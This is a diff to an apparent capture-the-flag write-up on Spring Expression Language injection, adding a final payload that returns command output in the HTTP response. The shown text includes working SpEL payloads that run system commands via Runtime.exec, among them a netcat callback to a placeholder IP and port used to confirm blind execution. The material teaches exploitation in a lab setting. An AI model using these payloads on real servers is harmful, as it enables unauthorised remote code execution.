@@ -220,7 +220,6 @@ T(java.lang.Runtime).getRuntime().exec('id')
 The request hangs for like 40 seconds, and we dont get any output in the HTTP response, so why not sending a command that doesn't require an HTTP response?
 let's set an "nc" listener, and set `quantity` value to the next payload:
 
-
 ```
 T(java.lang.Runtime).getRuntime().exec('nc%20IP%20PORT')
 
@@ -229,3 +228,12 @@ T(java.lang.Runtime).getRuntime().exec('nc%20IP%20PORT')
 
 Nice, so we **verified our code execution** on the webserver, lets try and grab our flag. 
 
+So in order to get output in the HTTP Response, we will use the "Spring Framework" `StreamUtils` class and call the `copyToString()` method. We can pass an input stream to this method and get the contents of the stream as a response.
+the finaly payload should look like the following: 
+
+```
+T(org.springframework.util.StreamUtils).copyToString(T(java.lang.Runtime).getRuntime().exec('ls').getInputStream(),'utf-8')
+```
+![Flag via ELi](https://gyazo.com/313633ccdab5e833cd3c120ca34eed08.png)
+
+Yay! Hope you've enjoyed it.
